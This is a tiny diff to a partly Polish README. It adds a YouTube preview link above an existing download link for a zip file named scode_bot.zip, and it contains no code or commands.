@@ -1,4 +1,4 @@
-### Preview 
+### Preview [See Preview](https://www.youtube.com/watch?v=4vaOVlWrctI)
 
 
 ### Link Do Pobrania [scode_bot.zip](https://github.com/user-attachments/files/23940790/scode_bot.zip)
